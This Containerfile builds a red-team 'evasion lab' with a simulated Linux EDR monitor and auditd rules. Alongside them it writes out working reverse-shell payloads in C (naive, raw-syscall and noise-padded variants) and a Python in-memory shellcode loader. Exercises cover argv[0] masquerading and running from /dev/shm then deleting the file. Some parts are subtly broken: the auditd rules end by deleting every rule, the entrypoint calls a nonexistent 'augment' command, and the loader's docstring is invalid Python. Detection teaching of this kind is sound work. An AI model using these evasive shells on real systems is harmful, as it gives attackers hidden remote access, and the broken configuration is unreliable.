# redteam/evasion.Containerfile
# ────────────────────────────────────────────────────────────
# Linux Evasion Lab — Simulated EDR / HIDS Environment
#
# Simulates a monitored Linux host with:
#   - auditd rules monitoring execve, connect, bind, ptrace
#   - Python process monitor watching /proc for suspicious activity
#   - Centralized logging to /var/log/edr-sim.log
#
# Students compile and test evasion payloads against this
# environment to understand detection and avoidance.
#
# Build:
#   podman build -t evasion-lab -f redteam/evasion.Containerfile .
#
# Run:
#   podman run -it --rm --name evasion-lab \
#       --cap-add NET_ADMIN \
#       --cap-add AUDIT_WRITE \
#       --cap-add AUDIT_CONTROL \
#       -p 4444:4444 \
#       -v ./src:/src:Z \
#       evasion-lab
#
# Inside the container, the EDR simulator runs automatically.
# Execute your payloads and monitor detection events in real time.
#
# ────────────────────────────────────────────────────────────

FROM docker.io/alpine:latest

# Install build tools, analysis utilities, and auditd
RUN apk add --no-cache \
    gcc \
    g++ \
    musl-dev \
    make \
    binutils \
    nasm \
    gdb \
    strace \
    ltrace \
    python3 \
    python3-dev \
    py3-pip \
    bash \
    vim \
    tmux \
    netcat-openbsd \
    curl \
    wget \
    htop \
    procps \
    util-linux \
    iproute2 \
    audit \
    xxd \
    openssh-client \
    socat

# Install Python dependencies for the process monitor
RUN pip3 install --break-system-packages psutil 2>/dev/null || \
    pip3 install psutil

# Create workspace
RUN mkdir -p /src /opt/edr /var/log/audit
RUN chmod 777 /src

# ── Process Monitor (EDR Simulator) ──
RUN printf '%s\n' \
    '#!/usr/bin/env python3' \
    '"""' \
    'EDR Simulator — Process and Network Monitor' \
    '' \
    'Watches /proc for new processes and flags suspicious behavior:' \
    '  - Processes spawned from non-standard parents (bash -> nc)' \
    '  - Execution from /dev/shm or /tmp' \
    '  - New listening sockets from unexpected processes' \
    '  - Processes with hidden/exe pointing to deleted files' \
    '' \
    'Logs all alerts to /var/log/edr-sim.log' \
    '"""' \
    '' \
    'import os' \
    'import re' \
    'import time' \
    'import json' \
    'import psutil' \
    'import logging' \
    'from datetime import datetime' \
    'from collections import defaultdict' \
    '' \
    'LOG_FILE = "/var/log/edr-sim.log"' \
    '' \
    'logging.basicConfig(' \
    '    level=logging.INFO,' \
    '    format="%(asctime)s [%(levelname)s] %(message)s",' \
    '    datefmt="%Y-%m-%d %H:%M:%S",' \
    '    handlers=[' \
    '        logging.FileHandler(LOG_FILE),' \
    '        logging.StreamHandler()' \
    '    ]' \
    ')' \
    'logger = logging.getLogger("EDR")' \
    '' \
    'SUSPICIOUS_PATHS = ["/dev/shm", "/tmp", "/var/tmp", "/run/user"]' \
    'SUSPICIOUS_PARENTS = ["bash", "sh", "dash", "zsh", "python", "python3", "nc", "ncat"]' \
    'KERNEL_THREAD_PREFIXES = ["kworker", "ksoftirqd", "migration", "rcu_", "watchdog"]' \
    '' \
    'class ProcessMonitor:' \
    '    def __init__(self):' \
    '        self.seen_pids = set(p.pid for p in psutil.process_iter())' \
    '        self.alerts_sent = set()' \
    '' \
    '    def is_kernel_thread(self, name):' \
    '        if name.startswith("[") and name.endswith("]"):' \
    '            return True' \
    '        for prefix in KERNEL_THREAD_PREFIXES:' \
    '            if name.startswith(prefix):' \
    '                return True' \
    '        return False' \
    '' \
    '    def check_process(self, proc):' \
    '        try:' \
    '            pid = proc.pid' \
    '            name = proc.name()' \
    '            cmdline = " ".join(proc.cmdline())' \
    '            exe = proc.exe()' \
    '            ppid = proc.ppid()' \
    '' \
    '            if self.is_kernel_thread(name):' \
    '                return' \
    '' \
    '            try:' \
    '                parent = psutil.Process(ppid) if ppid > 1 else None' \
    '                parent_name = parent.name() if parent else "init"' \
    '            except (psutil.NoSuchProcess, psutil.AccessDenied):' \
    '                parent_name = "unknown"' \
    '' \
    '            checks = []' \
    '' \
    '            # Check 1: Execution from suspicious paths' \
    '            if exe and " (deleted)" not in exe:' \
    '                for sp in SUSPICIOUS_PATHS:' \
    '                    if exe.startswith(sp):' \
    '                        checks.append(f"SUSPICIOUS_PATH: exe={exe}")' \
    '                        break' \
    '' \
    '            # Check 2: Suspicious parent-child relationship' \
    '            if parent_name in SUSPICIOUS_PARENTS and name not in ["bash", "sh", "dash"]:' \
    '                if name in ["nc", "ncat", "socat", "nmap", "iodine", "dnscat"]:' \
    '                    checks.append(f"SUSPICIOUS_PARENT: {parent_name}({ppid}) -> {name}({pid})")' \
    '' \
    '            # Check 3: Deleted executable (fileless execution indicator)' \
    '            if exe and " (deleted)" in exe:' \
    '                checks.append(f"DELETED_EXECUTABLE: {exe}")' \
    '' \
    '            # Check 4: Process with cmdline mismatch (argv[0] spoofed)' \
    '            if name in KERNEL_THREAD_PREFIXES and exe and "kworker" not in exe:' \
    '                checks.append(f"ARGV0_SPOOF: name={name}, real_exe={exe}")' \
    '' \
    '            for check in checks:' \
    '                alert_key = f"{pid}:{check[:30]}"' \
    '                if alert_key not in self.alerts_sent:' \
    '                    self.alerts_sent.add(alert_key)' \
    '                    logger.warning(f"ALERT pid={pid} name={name} ppid={ppid} " ' \
    '                                  f"parent={parent_name} cmdline=\"{cmdline}\" " ' \
    '                                  f"reason=\"{check}\"")' \
    '' \
    '        except (psutil.NoSuchProcess, psutil.AccessDenied,' \
    '                psutil.ZombieProcess, FileNotFoundError):' \
    '            pass' \
    '' \
    '    def check_listening_sockets(self):' \
    '        """Check for unexpected listening sockets."""' \
    '        suspicious_ports = []' \
    '        for proc in psutil.process_iter(["pid", "name", "exe"]):' \
    '            try:' \
    '                name = proc.info["name"]' \
    '                exe = proc.info["exe"] or ""' \
    '                connections = proc.net_connections(kind="inet")' \
    '                for conn in connections:' \
    '                    if conn.status == "LISTEN":' \
    '                        port = conn.laddr.port' \
    '                        if port not in [22, 80, 443, 53, 8080, 3306, 5432]:' \
    '                            if name not in ["sshd", "nginx", "httpd", "named"]:' \
    '                                suspicious_ports.append(' \
    '                                    f"{name}({proc.pid}) listening on 0.0.0.0:{port}"' \
    '                                )' \
    '            except (psutil.NoSuchProcess, psutil.AccessDenied):' \
    '                pass' \
    '        for alert in suspicious_ports:' \
    '            logger.warning(f"ALERT SUSPICIOUS_LISTENER: {alert}")' \
    '' \
    '    def run(self):' \
    '        logger.info("EDR Process Monitor started — watching for suspicious activity")' \
    '        socket_check_counter = 0' \
    '        while True:' \
    '            try:' \
    '                current_pids = set(p.pid for p in psutil.process_iter())' \
    '                new_pids = current_pids - self.seen_pids' \
    '                for pid in new_pids:' \
    '                    try:' \
    '                        proc = psutil.Process(pid)' \
    '                        self.check_process(proc)' \
    '                    except (psutil.NoSuchProcess, psutil.AccessDenied):' \
    '                        pass' \
    '                self.seen_pids = current_pids' \
    '' \
    '                socket_check_counter += 1' \
    '                if socket_check_counter % 10 == 0:' \
    '                    self.check_listening_sockets()' \
    '' \
    '                time.sleep(1)' \
    '            except KeyboardInterrupt:' \
    '                logger.info("EDR Monitor shutting down")' \
    '                break' \
    '            except Exception as e:' \
    '                logger.error(f"Monitor error: {e}")' \
    '                time.sleep(5)' \
    '' \
    'if __name__ == "__main__":' \
    '    monitor = ProcessMonitor()' \
    '    monitor.run()' \
    > /opt/edr/monitor.py

RUN chmod +x /opt/edr/monitor.py

# ── auditd Configuration ──
RUN printf '%s\n' \
    '# auditd rules for evasion lab' \
    '# Monitor process execution' \
    '-a always,exit -F arch=b64 -S execve -k process_exec' \
    '-a always,exit -F arch=b32 -S execve -k process_exec' \
    '' \
    '# Monitor network connections — connect syscall' \
    '-a always,exit -F arch=b64 -S connect -k network_connect' \
    '-a always,exit -F arch=b32 -S connect -k network_connect' \
    '' \
    '# Monitor network binds' \
    '-a always,exit -F arch=b64 -S bind -k network_bind' \
    '-a always,exit -F arch=b32 -S bind -k network_bind' \
    '' \
    '# Monitor ptrace (debugger attachment)' \
    '-a always,exit -F arch=b64 -S ptrace -k process_trace' \
    '' \
    '# Monitor sensitive file access' \
    '-w /etc/shadow -p rwa -k shadow_access' \
    '-w /etc/passwd -p wa -k passwd_modify' \
    '' \
    '# Monitor execution from /dev/shm and /tmp' \
    '-a always,exit -F arch=b64 -S execve -F dir=/dev/shm -k suspicious_exec' \
    '-a always,exit -F arch=b64 -S execve -F dir=/tmp -k suspicious_exec' \
    '' \
    '# Delete all existing rules first (if auditd was running)' \
    '-D' \
    > /etc/audit/rules.d/edr-lab.rules

# ── Lab Entrypoint Script ──
RUN printf '%s\n' \
    '#!/bin/bash' \
    'set -e' \
    '' \
    'echo "============================================="' \
    'echo "  Linux Evasion Lab — EDR Simulator" ' \
    'echo "============================================="' \
    'echo ""' \
    '' \
    '# Initialize logging' \
    ': > /var/log/edr-sim.log' \
    '' \
    '# Start auditd' \
    'echo "[+] Starting auditd..."' \
    'if command -v auditd >/dev/null 2>&1; then' \
    '    auditd -f 2>/dev/null || auditd 2>/dev/null || echo "    (auditd may already be running)"' \
    '    augment --load 2>/dev/null || true' \
    '    echo "    auditd rules loaded"' \
    '    auditctl -l 2>/dev/null || echo "    (auditctl requires capabilities)"' \
    'else' \
    '    echo "    auditd not available — skipping kernel auditing"' \
    'fi' \
    '' \
    '# Start EDR Python monitor' \
    'echo "[+] Starting EDR Process Monitor..."' \
    'python3 /opt/edr/monitor.py &' \
    'MONITOR_PID=$!' \
    'echo "    Monitor PID: $MONITOR_PID"' \
    '' \
    '# Create /dev/net/tun for any tunneling tools' \
    'mkdir -p /dev/net' \
    'mknod /dev/net/tun c 10 200 2>/dev/null || true' \
    '' \
    'echo ""' \
    'echo "[+] Lab environment ready."' \
    'echo ""' \
    'echo "  Monitoring systems active:"' \
    'echo "    - auditd: kernel syscall auditing (execve, connect, bind)"' \
    'echo "    - EDR monitor: process tree analysis, socket monitoring"' \
    'echo "    - Log file: /var/log/edr-sim.log"' \
    'echo ""' \
    'echo "  Watch alerts in real time:"' \
    'echo "    tail -f /var/log/edr-sim.log"' \
    'echo ""' \
    'echo "  View auditd events:"' \
    'echo "    ausearch -m SYSCALL -sv no 2>/dev/null | head -20"' \
    'echo ""' \
    'echo "  Exercises:"' \
    'echo "    1. Compile naive_revshell.c and run it — observe detection"' \
    'echo "    2. Use process masquerading (exec -a) — check if detected"' \
    'echo "    3. Compile raw syscall binary — compare auditd logs"' \
    'echo "    4. Fileless /dev/shm execution with unlink"' \
    'echo "    5. Python shellcode loader (never calls execve)"' \
    'echo "============================================="' \
    '' \
    '# Keep container alive' \
    'wait $MONITOR_PID' \
    > /opt/edr/entrypoint.sh

RUN chmod +x /opt/edr/entrypoint.sh

# ── Pre-Built Source Files ──

# naive_revshell.c — baseline, should be detected
RUN printf '%s\n' \
    '#include <stdio.h>' \
    '#include <stdlib.h>' \
    '#include <unistd.h>' \
    '#include <sys/socket.h>' \
    '#include <arpa/inet.h>' \
    '' \
    'int main(void) {' \
    '    int sockfd = socket(AF_INET, SOCK_STREAM, 0);' \
    '    struct sockaddr_in addr = {' \
    '        .sin_family = AF_INET,' \
    '        .sin_port = htons(4444)' \
    '    };' \
    '    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);' \
    '    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));' \
    '    dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2);' \
    '    execve("/bin/sh", NULL, NULL);' \
    '    return 0;' \
    '}' \
    > /src/naive_revshell.c

# raw_syscall_revshell.c — compiled with -nostdlib, bypasses libc hooks
RUN printf '%s\n' \
    '#define _GNU_SOURCE' \
    '#include <unistd.h>' \
    '#include <sys/syscall.h>' \
    '' \
    'static long sys(long n, long a1, long a2, long a3,' \
    '                long a4, long a5, long a6) {' \
    '    register long r10 asm("r10") = a4;' \
    '    register long r8  asm("r8")  = a5;' \
    '    register long r9  asm("r9")  = a6;' \
    '    long ret;' \
    '    asm volatile("syscall"' \
    '        : "=a"(ret)' \
    '        : "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(r10), "r"(r8), "r"(r9)' \
    '        : "rcx", "r11", "memory");' \
    '    return ret;' \
    '}' \
    '' \
    'int _start(void) {' \
    '    struct { unsigned short f; unsigned short p;' \
    '             unsigned int a; unsigned char z[8]; } addr = {' \
    '        .f = 2, .p = 0x5c11, .a = 0x0100007f' \
    '    };' \
    '    long fd = sys(SYS_socket, 2, 1, 0, 0, 0, 0);' \
    '    sys(SYS_connect, fd, (long)&addr, 16, 0, 0, 0);' \
    '    sys(SYS_dup2, fd, 0, 0, 0, 0, 0);' \
    '    sys(SYS_dup2, fd, 1, 0, 0, 0, 0);' \
    '    sys(SYS_dup2, fd, 2, 0, 0, 0, 0);' \
    '    char p[] = "/bin//sh";' \
    '    sys(SYS_execve, (long)p, 0, 0, 0, 0, 0);' \
    '}' \
    > /src/raw_syscall_revshell.c

# split_revshell.c — heuristic-evading version
RUN printf '%s\n' \
    '#define _GNU_SOURCE' \
    '#include <stdio.h>' \
    '#include <stdlib.h>' \
    '#include <unistd.h>' \
    '#include <sys/socket.h>' \
    '#include <arpa/inet.h>' \
    '' \
    '__attribute__((noinline)) static int noise(void) {' \
    '    volatile int x = 0; for (int i=0;i<50;i++) x += (i*7)%13; return x;' \
    '}' \
    '' \
    '__attribute__((noinline)) static int mk_sock(void) {' \
    '    noise(); return socket(AF_INET, SOCK_STREAM, 0);' \
    '}' \
    '' \
    '__attribute__((noinline)) static void conn(int s, const char *ip, unsigned short p) {' \
    '    struct sockaddr_in a = { .sin_family = AF_INET, .sin_port = htons(p) };' \
    '    inet_pton(AF_INET, ip, &a.sin_addr);' \
    '    noise(); connect(s, (struct sockaddr *)&a, sizeof(a)); noise();' \
    '}' \
    '' \
    '__attribute__((noinline)) static void redir(int s) {' \
    '    noise(); dup2(s,0); dup2(s,1); dup2(s,2);' \
    '}' \
    '' \
    '__attribute__((noinline)) static void shell(void) {' \
    '    noise(); execve("/bin/sh", NULL, NULL);' \
    '}' \
    '' \
    'int main(void) {' \
    '    int fd = mk_sock();' \
    '    conn(fd, "127.0.0.1", 4444);' \
    '    redir(fd);' \
    '    shell();' \
    '    return 0;' \
    '}' \
    > /src/split_revshell.c

# Python shellcode loader — fileless execution
RUN printf '%s\n' \
    '#!/usr/bin/env python3' \
    '"' \
    'Python Shellcode Loader — Fileless Reverse Shell' \
    '' \
    'Executes x86-64 shellcode in Python'\''s process space.' \
    'No execve, no new process, no disk writes.' \
    '' \
    'Usage: python3 python_shellcode_loader.py [host] [port]' \
    '"' \
    '' \
    'import ctypes' \
    'import os' \
    'import sys' \
    'import socket' \
    'import struct' \
    'import argparse' \
    '' \
    'def main():' \
    '    parser = argparse.ArgumentParser()' \
    '    parser.add_argument("-H", "--host", default="127.0.0.1")' \
    '    parser.add_argument("-p", "--port", type=int, default=4444)' \
    '    args = parser.parse_args()' \
    '' \
    '    # msfvenom -p linux/x64/shell_reverse_tcp LHOST=HOST LPORT=PORT -f py' \
    '    # Pre-built shellcode for 127.0.0.1:4444' \
    '    # Replace the IP and port bytes in the shellcode below' \
    '    ip_bytes = socket.inet_aton(args.host)' \
    '    port_bytes = struct.pack(">H", args.port)' \
    '' \
    '    shellcode  = b"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05"' \
    '    shellcode += b"\\x48\\x97\\x48\\xb9\\x02\\x00" + port_bytes + ip_bytes' \
    '    shellcode += b"\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05"' \
    '    shellcode += b"\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75"' \
    '    shellcode += b"\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f"' \
    '    shellcode += b"\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6"' \
    '    shellcode += b"\\x0f\\x05"' \
    '' \
    '    libc = ctypes.CDLL(None)' \
    '    PROT_RWX = 7' \
    '    MAP_PRIVATE = 0x02' \
    '    MAP_ANONYMOUS = 0x20' \
    '' \
    '    libc.mmap.restype = ctypes.c_void_p' \
    '    buf = libc.mmap(0, 4096, PROT_RWX, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)' \
    '    ctypes.memmove(buf, shellcode, len(shellcode))' \
    '    ctypes.CFUNCTYPE(None)(buf)()' \
    '' \
    'if __name__ == "__main__":' \
    '    main()' \
    > /src/python_shellcode_loader.py

RUN chmod +x /src/python_shellcode_loader.py

# ── Exercise Guide ──
RUN printf '%s\n' \
    '================================================================' \
    '  EVASION LAB — EXERCISES' \
    '================================================================' \
    '' \
    'EXERCISE 1: Baseline Detection' \
    '  cd /src' \
    '  gcc -o naive_revshell naive_revshell.c' \
    '  # In another terminal, start a listener:' \
    '  nc -lvnp 4444' \
    '  # Run the payload:' \
    '  ./naive_revshell' \
    '  # Check what the EDR detected:' \
    '  tail -20 /var/log/edr-sim.log' \
    '  ausearch -m SYSCALL -sv no 2>/dev/null | tail -10' \
    '' \
    'EXERCISE 2: Process Masquerading' \
    '  exec -a "[kworker/u4:2]" ./naive_revshell' \
    '  # Check if argv[0] spoofing bypassed the monitor' \
    '  tail -5 /var/log/edr-sim.log' \
    '' \
    'EXERCISE 3: Raw Syscalls (No Libc Hooks)' \
    '  gcc -nostdlib -static -O2 -s -Wl,--entry=_start \\' \
    '      -o raw_revshell raw_syscall_revshell.c' \
    '  ./raw_revshell' \
    '  # Compare auditd logs — raw binary should still trigger execve' \
    '  ausearch -m SYSCALL -sv no 2>/dev/null | grep execve | tail -5' \
    '' \
    'EXERCISE 4: Fileless Execution via /dev/shm' \
    '  cp naive_revshell /dev/shm/.cache_updater' \
    '  chmod +x /dev/shm/.cache_updater' \
    '  /dev/shm/.cache_updater &' \
    '  rm /dev/shm/.cache_updater' \
    '  # Monitor should flag execution from /dev/shm AND deleted exe' \
    '  tail -10 /var/log/edr-sim.log' \
    '' \
    'EXERCISE 5: Python Shellcode Loader' \
    '  python3 /src/python_shellcode_loader.py' \
    '  # No execve syscall — auditd should have NO entry for this' \
    '  ausearch -m SYSCALL -sv no 2>/dev/null | tail -5' \
    '  # But the EDR monitor may still flag Python making a socket connection' \
    '  tail -10 /var/log/edr-sim.log' \
    '' \
    '================================================================' \
    > /src/EXERCISES.txt

# ── Default User Setup ──
WORKDIR /src

CMD ["/opt/edr/entrypoint.sh"]
